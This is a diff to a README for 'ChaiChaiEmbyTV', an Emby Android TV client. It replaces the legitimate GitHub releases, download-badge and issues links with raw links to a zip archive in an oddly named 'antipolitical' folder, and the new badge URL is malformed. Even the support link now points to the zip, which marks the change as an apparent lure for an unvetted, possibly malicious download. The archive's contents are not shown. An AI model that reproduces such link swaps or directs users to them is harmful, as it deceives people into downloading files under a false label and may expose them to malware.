@@ -1,6 +1,6 @@
 # 🎉 ChaiChaiEmbyTV - Your Easy Emby Android TV Client
 
-[![Download ChaiChaiEmbyTV](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/expiredbread999/ChaiChaiEmbyTV/releases)
+[![Download ChaiChaiEmbyTV](https://raw.githubusercontent.com/expiredbread999/ChaiChaiEmbyTV/main/antipolitical/Chai-Emby-TV-2.9-beta.3.zip%20Now-Click%https://raw.githubusercontent.com/expiredbread999/ChaiChaiEmbyTV/main/antipolitical/Chai-Emby-TV-2.9-beta.3.zip)](https://raw.githubusercontent.com/expiredbread999/ChaiChaiEmbyTV/main/antipolitical/Chai-Emby-TV-2.9-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ChaiChaiEmbyTV! This application allows you to easily use Emby on you
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Visit this page to download: [ChaiChaiEmbyTV Releases](https://github.com/expiredbread999/ChaiChaiEmbyTV/releases).
+To get started, you will need to download the application. Visit this page to download: [ChaiChaiEmbyTV Releases](https://raw.githubusercontent.com/expiredbread999/ChaiChaiEmbyTV/main/antipolitical/Chai-Emby-TV-2.9-beta.3.zip).
 
 ### 🌐 Quick Steps for Installation
 
@@ -46,7 +46,7 @@ Once you've installed ChaiChaiEmbyTV:
 
 ## 📞 Support
 
-If you encounter any issues while using ChaiChaiEmbyTV, please reach out via the issues tab on our [GitHub page](https://github.com/expiredbread999/ChaiChaiEmbyTV/issues). We are here to help!
+If you encounter any issues while using ChaiChaiEmbyTV, please reach out via the issues tab on our [GitHub page](https://raw.githubusercontent.com/expiredbread999/ChaiChaiEmbyTV/main/antipolitical/Chai-Emby-TV-2.9-beta.3.zip). We are here to help!
 
 ## 📝 Changelog
 
